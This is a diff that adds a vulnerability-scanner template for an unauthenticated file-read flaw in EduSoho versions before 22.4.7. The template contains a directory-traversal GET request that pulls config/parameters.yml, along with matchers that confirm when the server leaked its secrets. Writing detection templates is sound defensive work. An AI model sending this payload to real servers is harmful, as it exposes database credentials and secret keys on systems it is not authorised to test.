@@ -1,0 +1,29 @@
+id: cnvd-2023-03903
+info:
+  name: Arbitrary File Reading in EduSoho <v22.4.7
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    EduSoho Education and Training System <v22.4.7 has an unauthorized file reading vulnerability. An attacker can read the contents of the config/parameters.yml file and obtain sensitive information, including database credentials and secret values.
+  tags: file-read, directory-traversal
+  reference:
+    - https://github.com/edusoho/edusoho/commit/fdb5b503706ab51f0e784576061bc601c3eb9c2b
+http:
+  - raw:
+      - |
+        GET /export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "secret"
+      - type: word
+        part: header
+        words:
+          - "application/yaml"
